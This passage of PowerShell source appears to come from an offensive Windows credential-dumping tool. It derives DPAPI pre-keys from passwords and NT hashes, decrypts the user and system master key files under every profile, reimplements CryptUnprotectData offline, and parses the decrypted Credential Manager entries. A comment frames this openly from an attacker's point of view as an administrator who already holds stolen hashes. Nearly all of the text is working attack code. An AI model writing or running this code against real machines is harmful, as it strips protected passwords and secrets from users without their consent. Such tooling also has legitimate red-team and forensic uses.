			$SHA1_Pwd = [System.Security.Cryptography.SHA1]::Create().ComputeHash([Text.Encoding]::Unicode.GetBytes($Pwd[$SID]))
			$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
			$HMACSHA1.Key = $SHA1_Pwd
			$UserPreKeys["Key1"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

			$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
			$HMACSHA1.Key = $NTH
			$UserPreKeys["Key2"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

			$TmpKey = PBKDF2_HMAC_SHA256 $NTH ([Text.Encoding]::Unicode.GetBytes($SID)) 256 10000
			$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
			$HMACSHA1.Key = $TmpKey2
			$UserPreKeys["Key3"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

			ForEach ($KeyNumber in $UserPreKeys.Keys)
			{
				$AlreadyExist = $False
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey $UserPreKeys[$KeyNumber] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-not $AlreadyExist) { $PreKeys += ,($UserPreKeys[$KeyNumber]) }
			}
		}
	}
	If ($NTHashes)
	{
		ForEach ($NTHash in $NTHashes)
		{
			$UserPreKeys = @{}

			$SID = ($NTHash.Keys -Join '')
			$NTH = $NTHash[$SID]

			$HMACSHA1 = [System.Security.Cryptography.HMACSHA1]::Create()
			$HMACSHA1.Key = $NTH
			$UserPreKeys["Key2"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

			$TmpKey = PBKDF2_HMAC_SHA256 $NTH ([Text.Encoding]::Unicode.GetBytes($SID)) 256 10000
			$TmpKey2 = (PBKDF2_HMAC_SHA256 $TmpKey ([Text.Encoding]::Unicode.GetBytes($SID)) 256 1)[0..15]
			$HMACSHA1.Key = $TmpKey2
			$UserPreKeys["Key3"] = $HMACSHA1.ComputeHash([Text.Encoding]::Unicode.GetBytes($SID + [Char]0x0))

			ForEach ($KeyNumber in $UserPreKeys.Keys)
			{
				$AlreadyExist = $False
				ForEach ($PreKey in $PreKeys)
				{
					If (@(Compare-Object $PreKey $UserPreKeys[$KeyNumber] -SyncWindow 0).Length -eq 0)
					{
						$AlreadyExist = $True
					}
				}
				If (-Not $AlreadyExist) { $PreKeys += ,($UserPreKeys[$KeyNumber]) }
			}
		}
	}
	
	return $PreKeys
}

function Decrypt-MasterKey($MKType, $PreKeys, $Enc_Key, $HashAlgo, $CipherAlgo, $Salt, $IterationCount)
{
	<#
		Decrypt-MasterKey:
			1- Decrypt a MasterKey (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)/Local Backup Encryption Key)
			2- Validate the MasterKey decryption success or not
	#>
	
	# Load C# Registry Key functions
	If (-Not (Test-Path Variable:Global:ALG_CLASS_ANY))
	{
		LoadCryptoConstants
	}
	
	If ($HashAlgo -eq $Global:ALGORITHMS["CALG_HMAC"])
	{
		$HashType = "SHA1"
	}
	Else
	{
		$HashType = $Global:ALGORITHMS_DATA[$HashAlgo][1]
	}
	Switch ($HashType)
	{
		"SHA1" { $Hasher = New-Object System.Security.Cryptography.HMACSHA1 }
		"SHA512" { $Hasher = New-Object System.Security.Cryptography.HMACSHA512 }
	}
	$KeyLen = $Global:ALGORITHMS_DATA[$CipherAlgo][0] + $Global:ALGORITHMS_DATA[$CipherAlgo][3]
	ForEach ($PreKey in $PreKeys)
	{
		$Hasher.Key = $PreKey
		$TmpKeyBlob = [byte[]]@()
		$i = 1
		While ($TmpKeyBlob.Length -lt $KeyLen)
		{
			$Bytes = [BitConverter]::GetBytes($i)
			[Array]::Reverse($Bytes)
			$U = $Salt + $Bytes
			$i += 1
			$Derived = $Hasher.ComputeHash($U)
			For ($x = 0; $x -lt $IterationCount-1; $x += 1)
			{
				$Actual = $Hasher.ComputeHash($Derived)
				$Derived = BigIntBooleanXor $Derived $Actual
				If ($Derived.Length -lt $Actual.Length)
				{
					$Derived += (,[byte]0) * ($Actual.Length - $Derived.Length)
				}
			}
			$TmpKeyBlob += $Derived
		}

		$TmpKey = $TmpKeyBlob[0..$($KeyLen-1)]
		$CipherKey = $TmpKey[0..$($Global:ALGORITHMS_DATA[$CipherAlgo][0]-1)]
		$IV = ($TmpKey[$($Global:ALGORITHMS_DATA[$CipherAlgo][0])..$($TmpKey.Length-1)])[0..$($Global:ALGORITHMS_DATA[$CipherAlgo][3]-1)]
		$Mode = ($Global:ALGORITHMS_DATA[$CipherAlgo])[2]
		Switch ($CipherAlgo)
		{
		   $Global:ALGORITHMS["CALG_3DES"] { $ClearText = TripleDESTransform $CipherKey $Enc_Key $IV $Mode $False }
		   $Global:ALGORITHMS["CALG_AES_256"] { $ClearText = AESTransform $CipherKey $Enc_Key $IV $False }
		}

		$Decrypted_MasterKey = $ClearText[$($ClearText.Length-64)..$($ClearText.Length-1)]
		$HMAC_Salt = $ClearText[0..15]
		$HMAC_Res = ($ClearText[16..$($ClearText.Length-1)])[0..$($Global:ALGORITHMS_DATA[$HashAlgo][0]-1)]

		$HMAC_Key = $Hasher.ComputeHash($HMAC_Salt)
		$Hasher.Key = $HMAC_Key
		$HMAC_Calc = $Hasher.ComputeHash($Decrypted_MasterKey)
		If (@(Compare-Object $HMAC_Calc[0..$($Global:ALGORITHMS_DATA[$HashAlgo][0]-1)] $HMAC_Res -SyncWindow 0).Length -eq 0)
		{
			Write-Host ("[...] Decrypted {0} with PreKey {1} = {2}" -f ($MKType, ([System.BitConverter]::ToString($PreKey).Replace("-", "")), ([System.BitConverter]::ToString($Decrypted_MasterKey).Replace("-", ""))))
			return $Decrypted_MasterKey
		}
	}

	Write-Host ("[...] None PreKeys allowed to decrypt {0}" -f ($MKType))
	return $Null
}

function ParseMasterKeyFile($PreKeys, $FileName)
{
	<#
		ParseMasterKeyFile:
			1- Extract elements of MasterKey File (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)/Local Backup Encryption Key)
			2- Decrypt them with Decrypt-MasterKey to obtain the unique MasterKey decrypted
	#>
	
	# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKeyFile
	$MasterKeyFile = [System.IO.File]::ReadAllBytes($FileName)
	$Version = $MasterKeyFile[0..3]
	$Unknown1 = $MasterKeyFile[4..7]
	$Unknown2 = $MasterKeyFile[8..11]
	$MKGUID = [Text.Encoding]::Unicode.GetString($MasterKeyFile[12..83])
	$Unknown3 = $MasterKeyFile[84..87]
	$Policy = $MasterKeyFile[88..91]
	$Flags = $MasterKeyFile[92..95]
	$MasterKeyLength = [BitConverter]::ToInt32($MasterKeyFile[96..103], 0)
	$LocalBackupEncryptionKeyLength = [BitConverter]::ToInt32($MasterKeyFile[104..111], 0)
	$CREDHIST_GUIDLength = [BitConverter]::ToInt32($MasterKeyFile[112..119], 0)
	$DomainBackupMasterKeyLength = [BitConverter]::ToInt32($MasterKeyFile[120..127], 0)

	$Keys = @{}
	$MasterKeyFile = $MasterKeyFile[128..$($MasterKeyFile.Length-1)]
	If ($MasterKeyLength -gt 0)
	{
		$Data = $MasterKeyFile[0..$($MasterKeyLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKey
		$Version = $Data[0..3]
		$Salt = $Data[4..19]
		$IterationCount = [BitConverter]::ToInt32($Data[20..23], 0)
		$HashAlgo = [BitConverter]::ToInt32($Data[24..27], 0)
		$CipherAlgo = [BitConverter]::ToInt32($Data[28..31], 0)
		$Enc_Key = $Data[32..$($Data.Length-1)]

		$MasterKey = Decrypt-MasterKey "MasterKey" $PreKeys $Enc_Key ([UInt64]$HashAlgo) ([UInt64]$CipherAlgo) $Salt $IterationCount
		If ($MasterKey) { $Keys["MasterKey"] = $MasterKey }

		$MasterKeyFile = $MasterKeyFile[$($MasterKeyLength)..$($MasterKeyFile.Length-1)]
	}
	If ($LocalBackupEncryptionKeyLength -gt 0)
	{
		# Local Backup Encryption Key can be use to decrypt Local Backup Master Key in Windows 2000
		# Out-of-scope and not implemented
		
		<#
		$Data = $MasterKeyFile[0..$($LocalBackupEncryptionKeyLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : MasterKey
		$Version = $Data[0..3]
		$Salt = $Data[4..19]
		$IterationCount = [BitConverter]::ToInt32($Data[20..23], 0)
		$HashAlgo = [BitConverter]::ToInt32($Data[24..27], 0)
		$CipherAlgo = [BitConverter]::ToInt32($Data[28..31], 0)
		$Enc_Key = $Data[32..$($Data.Length-1)]

		$LocalBackupEncryptionKey = Decrypt-MasterKey "LocalBackupEncryptionKey" $PreKeys $Enc_Key ([UInt64]$HashAlgo) ([UInt64]$CipherAlgo) $Salt $IterationCount
		If ($LocalBackupEncryptionKey) { $Keys["LocalBackupEncryptionKey"] = $LocalBackupEncryptionKey }
		#>
		
		$MasterKeyFile = $MasterKeyFile[$($LocalBackupEncryptionKeyLength)..$($MasterKeyFile.Length-1)]
	}
	If ($CREDHIST_GUIDLength -gt 0)
	{
		# Not used to decrypt MasterKey for now, but point to CREDHIST File that contain Old User's PreKeys encrypted which may be use to decrypt MasterKey
		
		<#
		$CREDHIST_GUID = $MasterKeyFile[0..$($CREDHIST_GUIDLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : CredHist
		$Version = $CREDHIST_GUID[0..3]
		$GUID = [Text.Encoding]::ASCII.GetString($CREDHIST_GUID[4..19])
		$Keys["CREDHIST_GUID"] = $GUID
		#>

		$MasterKeyFile = $MasterKeyFile[$($CREDHIST_GUIDLength)..$($MasterKeyFile.Length-1)]
	}
	If ($DomainBackupMasterKeyLength -gt 0)
	{
		# Not implemented Domain Backup Master Key decryption for now
		
		<#
		$Data = $MasterKeyFile[0..$($DomainBackupMasterKeyLength-1)]
		# Structure from Pypykatz DPAPI/Structures/MasterKeyFile.py : DomainKey
		$Version = $Data[0..3]
		$SecretLength = [BitConverter]::ToInt32($Data[4..7], 0)
		$AccessCheckLength = [BitConverter]::ToInt32($Data[8..11], 0)
		$GUID = $Data[12..27]
		$Secret = $Data[28..$(28+($SecretLength-1))]
		$AccessCheck = $Data[$(28+$SecretLength)..$(28+$SecretLength+$AccessCheckLength-1)]
		$Keys["DomainBackupMasterKey"] = Decrypt-DomainBackupMasterKey ...
		#>
	}

	return ($MKGUID, $Keys)
}

function Get-MasterKeysFromFiles($LSA_DPAPI_SYSTEM, $SAM, $Pwds, $NTHashes)
{
	<#
		Get-MasterKeysFromFiles:
			1- Get all Users' MasterKey Files and try to decrypt each elements to obtain the decrypted MasterKey
				- C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<UserSID>\<MKGUID>		
			2- Get all System's MasterKey Files and try to decrypt each elements to obtain the decrypted MasterKey
				- C:\Windows\System32\Microsoft\Protect\User\<MKGUID> (System User Master Key File)
				- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
	#>
	
	Write-Host ("`n[===] Try to decrypt all Master Keys Files with LSA DPAPI System Machine/User Keys and user's passwords/NT Hashes")

	# Retrieve all Pre Keys
	Write-Host ("[+] Compute PreKeys")
	$PreKeys = Get-PreKeys $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHashes
	ForEach ($PreKey in $PreKeys)
	{
		Write-Host ("[...] {0}" -f ([System.BitConverter]::ToString($PreKey).Replace("-", "")))
	}

	$MasterKeys = @{}

	# Get Users' Master Keys decrypted
	$UserMasterKeys = @{}
	ForEach ($User in (Get-ChildItem "C:\Users" -Force)) # -Attributes Directory+!ReparsePoint,Directory+Hidden+!ReparsePoint
	{
		If (Test-Path "C:\Users\$User\AppData\Roaming\Microsoft\Protect")
		{
			$SID = (Get-ChildItem "C:\Users\$User\AppData\Roaming\Microsoft\Protect").Name
			ForEach ($UserMasterKeyFileName in (Get-ChildItem "C:\Users\$User\AppData\Roaming\Microsoft\Protect\$SID" -Force))
			{
				If ($UserMasterKeyFileName -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
				{
					Write-Host ("[+] Found User MasterKey File {0}" -f ($UserMasterKeyFileName))
					$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "$Env:APPDATA\Microsoft\Protect\$SID\$UserMasterKeyFileName"
					If ($Keys.Count -ne 0) { $UserMasterKeys[$MKGUID] = $Keys }
				}
			}
		}
	}
	$MasterKeys["User"] = $UserMasterKeys

	# Get System's Master Keys decrypted
	$SystemMasterKeys = @{}
	ForEach ($SIDItem in (Get-ChildItem "C:\Windows\System32\Microsoft\Protect" -Force))
	{
		$SID = ($SIDItem).Name
		If ($SID -Match "S-[0-9]+-[0-9]+-[0-9]+")
		{
			ForEach ($Item in (Get-ChildItem "C:\Windows\System32\Microsoft\Protect\$SID" -Force)) # -Attributes Directory,Hidden
			{
				If ($Item -match "User")
				{
					ForEach ($ItemUser in (Get-ChildItem "C:\Windows\System32\Microsoft\Protect\$SID\User" -Force))
					{
						If ($ItemUser -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
						{
							$SystemUserMasterKeyFileName = $ItemUser
							Write-Host ("[+] Found System User MasterKey File {0}" -f ($SystemUserMasterKeyFileName))
							$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Windows\System32\Microsoft\Protect\$SID\User\$SystemUserMasterKeyFileName"
							If ($Keys.Count -ne 0) { $SystemMasterKeys[$MKGUID] = $Keys }
						}
					}
				}
				ElseIf ($Item -Match "([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)-([a-z0-9]*)")
				{
					$SystemMachineMasterKeyFileName = $Item
					Write-Host ("[+] Found System Machine MasterKey File {0}" -f ($SystemMachineMasterKeyFileName))
					$MKGUID, $Keys = ParseMasterKeyFile $PreKeys "C:\Windows\System32\Microsoft\Protect\$SID\$SystemMachineMasterKeyFileName"
					If ($Keys.Count -ne 0) { $SystemMasterKeys[$MKGUID] = $Keys }
				}
			}
		}
	}
	$MasterKeys["System"] = $SystemMasterKeys

	return $MasterKeys
}

### Decrypt a DPAPI Blob with MasterKeys ###

function MKGUID($Data)
{
	<#
		MKGUID: Compute MKGUID from bytes array into DPAPI Blob
	#>
	
	$Data1 = [BitConverter]::ToInt32($Data[0..3], 0)
	$Data1 = '{0:x8}' -f $Data1
	$Data2 = [BitConverter]::ToInt16($Data[4..5], 0)
	$Data2 = '{0:x4}' -f $Data2
	$Data3 = [BitConverter]::ToInt16($Data[6..7], 0)
	$Data3 = '{0:x4}' -f $Data3
	$X = $Data[8..9]
	[Array]::Reverse($X)
	$X = [BitConverter]::ToInt16($X, 0)
	$Data4 = '{0:x4}' -f $X
	$X = $Data[10..15]
	[Array]::Reverse($X)
	$X = [BitConverter]::ToInt64($X + (,([byte]0) * 2), 0)
	$Data5 = '{0:x12}' -f $X

	return "$Data1-$Data2-$Data3-$Data4-$Data5"
}

# Implementation of CryptUnprotectData() of Windows API
# Calling the function CryptUnprotectData() in the context of a user allow to retrieve the secret, encrypted with User MasterKey (which is encrypted with User PreKey), without providing his password
# From the attacker point of view, we are administrator of the computer and we may have gathered password/NT hash for a specific user
# => So we have to implement the cryptographic decryption process of CryptUnprotectData() from Windows API without using It
function Decrypt-DPAPIBlob($Blob, $MasterKeys, $Entropy)
{
	<#
		Decrypt-DPAPIBlob: Decrypt a DPAPI Blob with all gathered MasterKeys
	#>
	
	# Load C# Registry Key functions
	If (-Not (Test-Path Variable:Global:ALG_CLASS_ANY))
	{
		LoadCryptoConstants
	}
	
	# Parse DPAPI Blob
	# Structure from Pypykatz DPAPI/Structures/Blob.py : DPAPI_BLOB
	$Version = $Blob[0..3]
	$Credential_GUID = $Blob[4..19]
	$Signature_Start_POS = 20
	$X = $Signature_Start_POS
	$Y = $X + 4
	$MasterKey_Version = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 16
	$MasterKey_GUID = MKGUID ($Blob[$($X)..$($Y-1)])
	$X = $Y
	$Y = $X + 4
	$Flags = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$DescriptionLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $DescriptionLength
	$Description = [BitConverter]::ToInt16($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$CipherAlgo = [UInt64]([BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0))
	$X = $Y
	$Y = $X + 4
	$CipherLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$SaltLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $SaltLength
	$Salt = $Blob[$($X)..$($Y-1)]
	$X = $Y
	$Y = $X + 4
	$HMACKeyLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	If ($HMACKeyLength -ge 1)
	{
		$X = $Y
		$Y = $X + $HMACKeyLength
		$HMACKey = $Blob[$($X)..$($Y-1)]
	}
	Else { $HMACKey = [byte[]]@() }
	$X = $Y
	$Y = $X + 4
	$HashAlgo = [UInt64]([BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0))
	$X = $Y
	$Y = $X + 4
	$HashLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + 4
	$HMACLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $HMACLength
	$HMAC = $Blob[$($X)..$($Y-1)]
	$X = $Y
	$Y = $X + 4
	$DataLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $DataLength
	$Data = $Blob[$($X)..$($Y-1)]
	$Signature_End_POS = $Y

	$ToSign = $Blob[$($Signature_Start_POS)..$($Signature_End_POS-1)]
	$X = $Y
	$Y = $X + 4
	$SignatureLength = [BitConverter]::ToInt32($Blob[$($X)..$($Y-1)], 0)
	$X = $Y
	$Y = $X + $SignatureLength
	$Signature = $Blob[$($X)..$($Y-1)]

	function FixParity($DESKey)
	{
		$Temp = [byte[]]@()
		For ($i = 0; $i -lt $DESKey.Length; $i += 1)
		{
			$T = [Convert]::ToString($DESKey[$($i)], 2)
			$T = "0" * (8 - $T.Length) + $T
			If (($T[0..6] -eq "1").Count % 2 -eq 0)
			{
				$Temp += ([BitConverter]::GetBytes([Convert]::ToInt32($T[0..6] + "1", 2)))[0]
			}
			Else
			{
				$Temp += ([BitConverter]::GetBytes([Convert]::ToInt32($T[0..6] + "0", 2)))[0]
			}
		}
	}

	$MasterKeyFound = $False
	ForEach ($MKType in $MasterKeys.Keys)
	{
		ForEach ($MKGUID in $MasterKeys[$MKType].Keys)
		{
			If ($MKGUID -eq $MasterKey_GUID)
			{
				$MasterKey = $MasterKeys[$MKType][$MKGUID]["MasterKey"]
				$MasterKeyFound = $True
				Break
			}
		}

		If ($MasterKeyFound) { Break }
	}

	If (-not $MasterKeyFound)
	{
		Write-Host ("[-] MasterKey with GUID {0} not found for decryption" -f ($MasterKey_GUID))
		return $Null
	}

	$MasterKeyHash = [System.Security.Cryptography.SHA1]::Create().ComputeHash($MasterKey)
	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
	{
		"SHA1" { $Hasher = New-Object System.Security.Cryptography.HMACSHA1 }
		"SHA512" { $Hasher = New-Object System.Security.Cryptography.HMACSHA512 }
	}
	If ($Entropy) { $ToHash = $Salt + $Entropy }
	Else { $ToHash = $Salt }
	$Hasher.Key = $MasterKeyHash
	$SessionKey = $Hasher.ComputeHash($ToHash)

	If ($SessionKey.Length -gt ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
	{
		$Hasher.Key = $SessionKey
		$DerivedKey = $Hasher.ComputeHash(@())
	}
	Else
	{
		$DerivedKey = $SessionKey
	}

	If ($DerivedKey.Length -lt ($Global:ALGORITHMS_DATA[$CipherAlgo])[0])
	{
		$DerivedKey += (,([byte]0) * ($Global:ALGORITHMS_DATA[$HashAlgo])[4])
		$X = [byte[]]@()
		ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x36) }
		$X = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
		$IPAD = [System.Text.Encoding]::ASCII.GetString($X)
		$X = [byte[]]@()
		ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x5c) }
		$X = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
		$OPAD = [System.Text.Encoding]::ASCII.GetString($X)

		$Hasher.Key = [System.Text.Encoding]::ASCII.GetBytes($IPAD)
		$X = $Hasher.ComputeHash(@())
		$Hasher.Key = [System.Text.Encoding]::ASCII.GetBytes($OPAD)
		$Y = $Hasher.ComputeHash(@())
		$DerivedKey = FixParity ($X + $Y)
	}

	$Key = $DerivedKey[0..$(($Global:ALGORITHMS_DATA[$CipherAlgo])[0]-1)]
	$Mode = ($Global:ALGORITHMS_DATA[$CipherAlgo])[2]
	$IV = (,([byte]0) * (($Global:ALGORITHMS_DATA[$CipherAlgo])[3]))
	Switch ($CipherAlgo)
	{
		$Global:ALGORITHMS["CALG_3DES"] { $ClearText = Unpad (TripleDESTransform $Key $Data $IV $Mode $False) }
		$Global:ALGORITHMS["CALG_AES_256"] { $ClearText = Unpad (AESTransform $Key $Data $IV $False) }
	}

	# Calculate the different HMACKeys
	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
	{
		"SHA1" { $HashBlockSize = 512 }
		"SHA512" { $HashBlockSize = 128 }
	}
	$MasterKeyHash2 = $MasterKeyHash + (,([byte]0) * $HashBlockSize)
	$X = [byte[]]@()
	ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x36) }
	$IPAD = $X[0..$($HashBlockSize-1)]
	$X = [byte[]]@()
	ForEach ($i in $MasterKeyHash) { $X += ($i -bxor 0x5c) }
	$OPAD = $X[0..$($HashBlockSize-1)]

	$ToHash = $IPAD + $HMAC
	$A = $Hasher.ComputeHash($ToHash)
	$ToHash = $OPAD + $A
	If ($Entropy) { $ToHash += $Entropy}
	$ToHash += $ToSign
	$HMAC_Calculated1 = $Hasher.ComputeHash($ToHash)

	$Hasher.Key = $MasterKeyHash
	$ToHash = $HMAC
	If ($Entropy) { $ToHash += $Entropy}
	$ToHash += $ToSign
	$HMAC_Calculated3 = $Hasher.ComputeHash($ToHash)

	If ((@(Compare-Object $HMAC_Calculated1 $Signature -SyncWindow 0).Length -eq 0) -or (@(Compare-Object $HMAC_Calculated3 $Signature -SyncWindow 0).Length -eq 0))
	{
		return $ClearText
	}
	Else
	{
		return $Null
	}
}

### Decrypt a credential file ###

function Decrypt-CredentialFile($FilePath, $MasterKeys)
{
	<#
		Decrypt-CredentialFile:
			- A Credential File contain a DPAPI Blob that contain secrets
	#>
	$CFContent = Get-Content $FilePath

	# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CredentialFile
	$Version = [BitConverter]::ToInt32($CFContent[0..3], 0)
	$Size = [BitConverter]::ToInt32($CFContent[4..7], 0)
	$Unknown = [BitConverter]::ToInt32($CFContent[8..11], 0)
	$Data = $CFContent[12..$(12+$Size-1)]

	$DecryptedBlob = Decrypt-DPAPIBlob $Data $MasterKeys $Null
	If ($DecryptedBlob)
	{
		# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDBLOBTYPE
		# Identify $CREDENTIAL_BLOB["Type"]
		$CREDBLOBTYPE = @{}
		$CREDBLOBTYPE["UNKNOWN"] = 0
		$CREDBLOBTYPE["GENERIC"] = 1
		$CREDBLOBTYPE["DOMAIN_PASSWORD"] = 2
		$CREDBLOBTYPE["DOMAIN_CERTIFICATE"] = 3
		$CREDBLOBTYPE["DOMAIN_VISIBLE_PASSWORD"] = 4
		$CREDBLOBTYPE["GENERIC_CERTIFICATE"] = 5
		$CREDBLOBTYPE["DOMAIN_EXTENDED"] = 6

		# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDENTIAL_BLOB
		$CREDENTIAL_BLOB = @{}
		$CREDENTIAL_BLOB["Flags"] = [BitConverter]::ToInt32($DecryptedBlob[0..3], 0)
		$CREDENTIAL_BLOB["Size"] = [BitConverter]::ToInt32($DecryptedBlob[4..7], 0)
		$CREDENTIAL_BLOB["Unknown0"] = [BitConverter]::ToInt32($DecryptedBlob[8..11], 0)
		$CREDENTIAL_BLOB["Type"] = [BitConverter]::ToInt32($DecryptedBlob[12..15], 0)
		$CREDENTIAL_BLOB["Flags2"] = [BitConverter]::ToInt32($DecryptedBlob[16..19], 0)
		$CREDENTIAL_BLOB["Last_Written"] = [BitConverter]::ToInt32($DecryptedBlob[20..27], 0)
		$CREDENTIAL_BLOB["Unknown1"] = [BitConverter]::ToInt32($DecryptedBlob[28..31], 0)
		$CREDENTIAL_BLOB["Persist"] = [BitConverter]::ToInt32($DecryptedBlob[32..35], 0)
		$CREDENTIAL_BLOB["Attributes_Count"] = [BitConverter]::ToInt32($DecryptedBlob[36..39], 0)
		$CREDENTIAL_BLOB["Unknown2"] = [BitConverter]::ToInt32($DecryptedBlob[40..47], 0)
		$CREDENTIAL_BLOB["TargetLength"] = [BitConverter]::ToInt32($DecryptedBlob[48..51], 0)
		If ($CREDENTIAL_BLOB["TargetLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["Target"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[52..$(52+$CREDENTIAL_BLOB["TargetLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["Target"] = $Null }
		$X = 52 + $CREDENTIAL_BLOB["TargetLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["TargetAliasLength"] = [BitConverter]::ToInt32($DecryptedBlob[$($X)..$($Y-1)], 0)
		If ($CREDENTIAL_BLOB["TargetAliasLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["TargetAlias"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($Y)..$($Y+$CREDENTIAL_BLOB["TargetAliasLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["TargetAlias"] = $Null }
		$X = $Y + $CREDENTIAL_BLOB["TargetAliasLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["DescriptionLength"] = [BitConverter]::ToInt32($DecryptedBlob[$($X)..$($Y-1)], 0)
		If ($CREDENTIAL_BLOB["DescriptionLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["Description"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($Y)..$($Y+$CREDENTIAL_BLOB["DescriptionLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["Description"] = $Null }
		$X = $Y + $CREDENTIAL_BLOB["DescriptionLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["Unknown3Length"] = [BitConverter]::ToInt32($DecryptedBlob[$($X)..$($Y-1)], 0)
		$X = $Y
		$Y = $X + $CREDENTIAL_BLOB["Unknown3Length"]
		If ($CREDENTIAL_BLOB["Unknown3Length"] -ge 1)
		{
			$CREDENTIAL_BLOB["Unknown3"] = $DecryptedBlob[$($X)..$($Y-1)]
		}
		Else { $CREDENTIAL_BLOB["Unknown3"] = $Null }
		$X = $Y
		$Y = $X + 4
		$CREDENTIAL_BLOB["UsernameLength"] = $DecryptedBlob[$($X)..$($Y-1)]
		If ($CREDENTIAL_BLOB["UsernameLength"] -ge 1)
		{
			$CREDENTIAL_BLOB["Username"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($Y)..$($Y+$CREDENTIAL_BLOB["UsernameLength"]-1)])
		}
		Else { $CREDENTIAL_BLOB["Username"] = $Null }
		$X = $Y + $CREDENTIAL_BLOB["UsernameLength"]
		$Y = $X + 4
		$CREDENTIAL_BLOB["Unknown4Length"] = $DecryptedBlob[$($X)..$($Y-1)]
		If ($CREDENTIAL_BLOB["Unknown4Length"] -ge 1)
		{
			$CREDENTIAL_BLOB["Unknown4"] = $DecryptedBlob[$($X)..$($Y-1)]
		}
		Else { $CREDENTIAL_BLOB["Unknown4"] = $Null }

		$X = $Y
		$CREDENTIAL_BLOB["Attributes"] = ,(,@())
		For ($i = 0; $i -lt $CREDENTIAL_BLOB["Attributes_Count"]; $i += 1)
		{
			# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDENTIAL_ATTRIBUTE
			$CRED_ATTRIBUTE = @{}
			$CRED_ATTRIBUTE["Flags"] = $DecryptedBlob[$($X)..$($X+3)]
			$CRED_ATTRIBUTE["KeywordLength"] = [BitConverter]::ToInt32($DecryptedBlob[$($X+4)..$($X+7)], 0)
			If ($CRED_ATTRIBUTE["KeywordLength"] -ge 1)
			{
				$CRED_ATTRIBUTE["Keyword"] = [System.Text.Encoding]::ASCII.GetString($DecryptedBlob[$($X+8)..$($X+8+$CRED_ATTRIBUTE["KeywordLength"]-1)])
			}
			Else { $CRED_ATTRIBUTE["Keyword"] = $Null }
			$X = $X + 8 + $CRED_ATTRIBUTE["KeywordLength"]
			$CRED_ATTRIBUTE["DataLength"] = [BitConverter]::ToInt32($DecryptedBlob[$($X)..$($X+3)], 0)
			$CRED_ATTRIBUTE["Data"] = [BitConverter]::ToInt32($DecryptedBlob[$($X+4)..$($X+4+$CRED_ATTRIBUTE["DataLength"]-1)], 0)

			$CREDENTIAL_BLOB["Attributes"] += $CRED_ATTRIBUTE

